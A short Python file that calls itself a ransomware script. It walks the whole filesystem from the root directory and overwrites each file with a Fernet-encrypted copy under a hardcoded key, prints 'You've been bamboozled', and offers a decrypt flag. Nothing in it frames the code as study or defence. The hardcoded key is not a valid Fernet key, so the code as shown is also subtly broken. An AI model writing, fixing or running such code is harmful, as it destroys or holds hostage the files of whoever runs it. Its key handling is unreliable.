import os
import argparse
from cryptography.fernet import Fernet

def encrypt_files(verbose=False):
    key = b'ransome'  # Hardcoded encryption key
    fernet = Fernet(key)
    if verbose:
        print("Encrypting files...")
    for root, dirs, files in os.walk("/"):  # Start from the root directory
        for file in files:
            file_path = os.path.join(root, file)
            if verbose:
                print("Encrypting:", file_path)
            with open(file_path, "rb") as f:
                data = f.read()
            encrypted_data = fernet.encrypt(data)
            with open(file_path, "wb") as f:
                f.write(encrypted_data)
    if verbose:
        print("Encryption complete.")

def decrypt_files(verbose=False):
    key = b'ransome'  # Hardcoded encryption key
    fernet = Fernet(key)
    if verbose:
        print("Decrypting files...")
    for root, dirs, files in os.walk("/"):  # Start from the root directory
        for file in files:
            file_path = os.path.join(root, file)
            if verbose:
                print("Decrypting:", file_path)
            with open(file_path, "rb") as f:
                data = f.read()
            decrypted_data = fernet.decrypt(data)
            with open(file_path, "wb") as f:
                f.write(decrypted_data)
    if verbose:
        print("Decryption complete.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Ransomware script")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose mode")
    parser.add_argument("-d", "--decrypt", action="store_true", help="Decrypt files instead of encrypting")
    args = parser.parse_args()

    print("You've been bamboozled.")

    if args.verbose:
        print("Verbose mode is enabled.")

    if args.decrypt:
        decrypt_files(verbose=args.verbose)
    else:
        encrypt_files(verbose=args.verbose)
